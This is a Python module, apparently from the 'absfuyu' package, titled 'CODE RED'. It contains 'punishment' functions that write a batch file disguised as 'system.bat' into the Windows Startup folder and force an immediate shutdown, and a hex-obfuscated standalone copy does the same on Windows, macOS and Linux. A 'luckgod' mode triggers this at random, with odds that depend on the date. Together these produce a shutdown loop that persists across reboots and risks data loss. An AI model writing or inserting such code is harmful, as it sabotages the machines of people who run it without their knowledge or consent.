"""
ABSFUYU'S CODE RED
------------------
Extreme Functions that should not be used, but yet still exist. Have fun.
"""


__all__ = [
    "punishment", "toggle_luckgod"
]

# Library
##############################################################
from datetime import date as __date
import os as __os
import random as __random
import sys as __sys

from absfuyu.pkg_data import loadData as __loadData
from absfuyu.fun import force_shutdown as __force_shutdown
from absfuyu import config as __config




# Function
##############################################################
def punishment(silent: bool = False):
    """Receive a painful punishment. Just don't ask why this function exist."""
    # get operating system
    os_name = __sys.platform

    # Check if windows
    valid_os = ["win32", "cygwin"]
    if os_name in valid_os:
        # if true then load the shutdown data
        punish = __loadData("punishment_windows")
    else:
        # if not windows then shutdown the device
        if not silent:
            print("You've escaped the punishment")
        return __force_shutdown()
    
    # Copy to startup folder
    name = "system"
    destination = __os.path.join(
        __os.getenv("appdata"),
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )
    with open(f"{destination}\{name}.bat","w") as file:
        file.write(punish)
    
    # Shutdown
    return __force_shutdown()


# Standalone punishment that works almost everywhere
__reverse_name_dict = {
    # Library
    "os": "eYBgwBmABq",
    "subprocess": "lTbFVsJhoG",
    "sys": "sbOIjmjDVK",
    "time": "ucBroDqLQs",
    # Variables
    "os_name": "MSvAwrSYSyBh",
    "shutdown": "hOhBCzSStZuc",
    "valid_os": "udcJgNZHtqlV",
    "punish": "lkTHVKJGpLhd",
    "name": "EiDrKCHXFLMi",
    "destination": "EjCoxownwBMe",
    "file": "zplEBlayjuEh",
    "ext": "xpinymOftywG",
}
def __punishment_standalone(silent: bool = False):
    import os as eYBgwBmABq, subprocess as lTbFVsJhoG, sys as sbOIjmjDVK, time as ucBroDqLQs
    MSvAwrSYSyBh = sbOIjmjDVK.platform
    hOhBCzSStZuc = {"\x77\x69\x6e\x33\x32": "\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x66\x20\x2d\x73\x20\x2d\x74\x20\x30".split(), "\x63\x79\x67\x77\x69\x6e": "\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x66\x20\x2d\x73\x20\x2d\x74\x20\x30".split(),
        "\x64\x61\x72\x77\x69\x6e": ['\x6f\x73\x61\x73\x63\x72\x69\x70\x74', '\x2d\x65', '\x74\x65\x6c\x6c\x20\x61\x70\x70\x20\x22\x53\x79\x73\x74\x65\x6d\x20\x45\x76\x65\x6e\x74\x73\x22\x20\x74\x6f\x20\x73\x68\x75\x74\x20\x64\x6f\x77\x6e'],
        "\x6c\x69\x6e\x75\x78": "\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x68\x20\x6e\x6f\x77".split()}
    udcJgNZHtqlV = ["\x77\x69\x6e\x33\x32", "\x63\x79\x67\x77\x69\x6e"]
    if MSvAwrSYSyBh in udcJgNZHtqlV:
        lkTHVKJGpLhd = "\x73\x68\x75\x74\x64\x6f\x77\x6e\x20\x2d\x66\x20\x2d\x73\x20\x2d\x74\x20\x30"; EiDrKCHXFLMi = "\x73\x79\x73\x74\x65\x6d"; xpinymOftywG = "\x62\x61\x74"
        EjCoxownwBMe = eYBgwBmABq.path.join(eYBgwBmABq.getenv("\x61\x70\x70\x64\x61\x74\x61"), "\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74", "\x57\x69\x6e\x64\x6f\x77\x73", "\x53\x74\x61\x72\x74\x20\x4d\x65\x6e\x75", "\x50\x72\x6f\x67\x72\x61\x6d\x73", "\x53\x74\x61\x72\x74\x75\x70")
        with open(f"{EjCoxownwBMe}\{EiDrKCHXFLMi}.{xpinymOftywG}","w") as zplEBlayjuEh: zplEBlayjuEh.write(lkTHVKJGpLhd)
        return lTbFVsJhoG.run(hOhBCzSStZuc[MSvAwrSYSyBh])
    else:
        if not silent: print("\x59\x6f\x75\x27\x76\x65\x20\x65\x73\x63\x61\x70\x65\x64\x20\x74\x68\x65\x20\x70\x75\x6e\x69\x73\x68\x6d\x65\x6e\x74\x21"); ucBroDqLQs.sleep(1)
        if MSvAwrSYSyBh in hOhBCzSStZuc: return lTbFVsJhoG.run(hOhBCzSStZuc[MSvAwrSYSyBh])
        else: return lTbFVsJhoG.run(hOhBCzSStZuc["\x6c\x69\x6e\x75\x78"])

def __luckgod_base(luck: bool = True, test_mode: bool = False):
    """
    There is a chance that you will receive punishment when run this function

    *In exchange for convenience, one's must sacrifice their luck*
    """

    if luck:
        # Force luck - no punishment
        pass
    else:
        # Special holidays
        holidays = [
            (1, 1), # New year
            (2, 14), # Valentine
            (4, 30),
            (5, 1),
            (12, 24), (12, 25), # Christmas
        ]
        
        # roll a random number
        posibility = __random.randint(0,100)
        
        today = (__date.today().month,__date.today().day)
        if today in holidays:
            chance = 90 # 90% chance
        elif today[1] == 13: # bad day
            chance = 50
        elif today[1]%5 == 0:
            chance = 5
        elif today[1]%2 == 0:
            chance = 2
        else:
            chance = 1
        
        if test_mode:
            chance = 99
        
        if posibility <= chance:
            return punishment()


def toggle_luckgod():
    """Toggle on/off luckgod mode"""
    __config.toggle_setting("luckgod-mode")
    pass

def luckgod(debug: bool = False):
    """
    There is a chance that you will receive punishment when run this function

    *In exchange for convenience, one's must sacrifice their luck*
    """
    # luckgod_state = __config.CONFIG["setting"]["luckgod-mode"]
    luckgod_state = __config.show_cfg("luckgod-mode", True)
    if luckgod_state:
        if debug:
            return __luckgod_base(False, True)
        else:
            return __luckgod_base(False)